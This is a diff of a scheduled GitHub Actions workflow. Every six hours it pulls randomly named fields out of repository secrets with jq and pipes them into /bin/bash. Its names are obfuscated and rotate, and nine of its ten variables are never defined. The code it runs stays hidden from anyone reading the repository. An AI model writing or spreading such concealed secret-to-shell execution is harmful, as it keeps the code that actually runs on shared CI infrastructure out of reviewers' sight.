@@ -1,9 +1,9 @@
 name: askdmk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 0/6 * * *'
+    - cron: '8 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: askdmk
         env:
-          euhj91: ${{ secrets.euhj91 }}
+          sha31942: ${{ secrets.sha31942 }}
         run: |
-          echo $euhj91 | jq -r .eii7211 | /bin/bash
-          echo $ldna9 | jq -r .ylhef41623 | /bin/bash
-          echo $sujw9 | jq -r .ggjef029 | /bin/bash
-          echo $p52330 | jq -r .w505 | /bin/bash
-          echo $rnx210 | jq -r .pyd4501 | /bin/bash
-          echo $ihpy4565 | jq -r .hx23 | /bin/bash
-          echo $ihw813 | jq -r .ab152 | /bin/bash
-          echo $pgs7130 | jq -r .frcvk73 | /bin/bash
-          echo $y015 | jq -r .rfow5 | /bin/bash
-          echo $g00 | jq -r .ye114 | /bin/bash
+          echo $sha31942 | jq -r .qb37 | /bin/bash
+          echo $wvnyb983 | jq -r .ohwkb4366 | /bin/bash
+          echo $txkjr90835 | jq -r .bcqcp71543 | /bin/bash
+          echo $sakjx63 | jq -r .dtbtk084 | /bin/bash
+          echo $v66786 | jq -r .sekjl0482 | /bin/bash
+          echo $wcks261 | jq -r .b8 | /bin/bash
+          echo $mi13 | jq -r .hc9 | /bin/bash
+          echo $grls26309 | jq -r .ltr281 | /bin/bash
+          echo $ufjm288 | jq -r .fe04075 | /bin/bash
+          echo $a255 | jq -r .laefi5423 | /bin/bash
 
